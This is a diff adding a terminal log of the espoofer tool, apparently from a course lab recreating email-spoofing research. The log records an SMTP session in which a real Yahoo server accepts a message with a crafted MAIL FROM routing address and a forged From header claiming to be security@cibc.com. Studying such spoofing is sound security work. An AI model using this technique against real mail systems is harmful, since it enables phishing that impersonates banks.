@@ -1,0 +1,52 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -id server_a7
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('67.195.204.72', 25)
+>>> 220 mtaproxy312.free.mail.bf1.yahoo.com ESMTP ready
+
+<<< ehlo testdomaintest.company
+
+>>> 250-mtaproxy312.free.mail.bf1.yahoo.com
+250-PIPELINING
+250-SIZE 41943040
+250-8BITMIME
+250 STARTTLS
+
+<<< mail from: <@cibc.com,@any.com:'any@testdomaintest.company>
+
+>>> 250 sender <@cibc.com,@any.com:'any@testdomaintest.company> ok
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 250 recipient <cis6510victim@yahoo.com> ok
+
+<<< data
+
+>>> 354 go ahead
+
+<<< From: <security@cibc.com>
+To: <cis6510victim@yahoo.com>
+Subject: A7: routing address in mailfrom
+Date: Tue, 24 Nov 2020 04:08:44 +0000
+Content-Type: text/plain; charset="UTF-8"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-3HZD0O@message-ids.testdomaintest.company>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 250 ok dirdel
+
+<<< quit
+
+>>> 221 2.0.0 Bye
+
+Finished.
